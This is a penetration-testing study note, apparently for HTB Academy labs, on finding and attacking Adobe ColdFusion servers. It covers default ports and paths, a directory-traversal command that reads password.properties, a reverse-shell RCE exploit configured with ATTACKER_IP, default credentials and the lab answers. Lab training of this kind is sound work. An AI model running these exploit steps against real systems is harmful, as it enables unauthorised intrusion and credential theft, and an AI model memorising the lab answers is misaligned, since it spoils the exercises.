# 🔥 ColdFusion Discovery & Enumeration

> **🎯 Objective:** Identify ColdFusion applications, enumerate version information, and discover default files and directories for further exploitation.

## Overview

**ColdFusion** is a Java-based web application development platform using **CFML (ColdFusion Markup Language)**. Commonly found in enterprise environments with specific file extensions (`.cfm`, `.cfc`) and default directories.

---

## HTB Academy Lab Solution

### Lab: Protocol Identification
**Question:** "What ColdFusion protocol runs on port 5500?"

#### ColdFusion Default Ports
| Port | Protocol | Description |
|------|----------|-------------|
| 80   | HTTP     | Non-secure web communication |
| 443  | HTTPS    | Secure web communication |
| 1935 | RPC      | Remote Procedure Call |
| 25   | SMTP     | Email communication |
| 8500 | SSL      | Server communication via SSL |
| **5500** | **Server Monitor** | **Remote administration** |

**Answer:** `Server Monitor`

---

## Discovery Methods

### 1. Port Scanning
```bash
# Nmap service detection
nmap -p- -sC -Pn TARGET --open

# Look for common ColdFusion ports
# 8500/tcp open  fmtp (ColdFusion SSL port)
```

### 2. File Extensions
- **`.cfm`** - ColdFusion Markup pages
- **`.cfc`** - ColdFusion Components

### 3. Default Directories
```bash
# Common ColdFusion paths
/CFIDE/
/cfdocs/
/CFIDE/administrator/
/CFIDE/administrator/index.cfm
```

### 4. HTTP Headers
```bash
# Response headers indicating ColdFusion
Server: ColdFusion
X-Powered-By: ColdFusion
```

### 5. Error Messages
- ColdFusion-specific error pages
- CFML tag references in errors
- Stack traces mentioning ColdFusion

---

## Enumeration Techniques

### Directory Structure
```bash
# Navigate to ColdFusion installation
http://TARGET:8500/

# Common findings:
# /CFIDE/ - Administrator interface
# /cfdocs/ - Documentation
```

### Version Detection
```bash
# Administrator login page
http://TARGET:8500/CFIDE/administrator/

# Look for version in:
# - Login page footer
# - Error messages
# - Default files
```

### File Discovery
```bash
# Common ColdFusion files
Application.cfm
index.cfm
admin.cfm
install.cfm
```

---

## Key Indicators

**Positive Identification:**
- 🔍 **Port 8500** open (SSL/administrator)
- 📁 **CFIDE directory** accessible
- 📄 **`.cfm` extensions** in responses
- 🏷️ **ColdFusion headers** in HTTP responses
- ⚠️ **CF error messages** with CFML references

**Attack Surfaces:**
- **Administrator interface** - Authentication bypass
- **Default credentials** - admin:admin, blank passwords
- **File upload** capabilities
- **Directory traversal** vulnerabilities
- **RCE via CFML** code execution

---

## HTB Academy Attacking Labs

### Lab: ColdFusion User Context
**Question:** "What user is ColdFusion running as?"

#### Method 1: Directory Traversal (CVE-2010-2861)
```bash
# Download directory traversal exploit
searchsploit -m multiple/remote/14641.py

# Extract password.properties file
python2 14641.py TARGET 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

# Result: Retrieves encrypted passwords and config data
```

#### Method 2: Unauthenticated RCE (CVE-2009-2265)
```bash
# Download RCE exploit
searchsploit -m cfm/webapps/50057.py

# Modify exploit variables:
# lhost = 'ATTACKER_IP'  # Your VPN IP
# lport = 4444           # Listener port  
# rhost = 'TARGET_IP'    # Target IP
# rport = 8500           # Target port

# Execute exploit for reverse shell
python3 50057.py

# In reverse shell, check user context
whoami
```

**Answer:** `arctic\tolis`

---

## ColdFusion Attack Vectors

### 1. Directory Traversal (CVE-2010-2861)
- **Vulnerable files:** `/CFIDE/administrator/settings/mappings.cfm`
- **Method:** Manipulate `locale` parameter with `../` sequences
- **Target:** Extract `password.properties` and config files

### 2. Unauthenticated RCE (CVE-2009-2265)  
- **Vulnerable path:** `/CFIDE/scripts/ajax/FCKeditor/`
- **Method:** File upload via FCKeditor functionality
- **Impact:** JSP shell upload → full system compromise

### 3. Common Exploits
```bash
# Search for ColdFusion exploits
searchsploit adobe coldfusion

# Key exploits:
# 14641.py - Directory Traversal
# 50057.py - Unauthenticated RCE  
# 27755.txt - Admin Authentication Bypass
```

**💡 Pro Tip:** ColdFusion installations often have default credentials or weak authentication on the administrator interface - always check `/CFIDE/administrator/` for access opportunities. 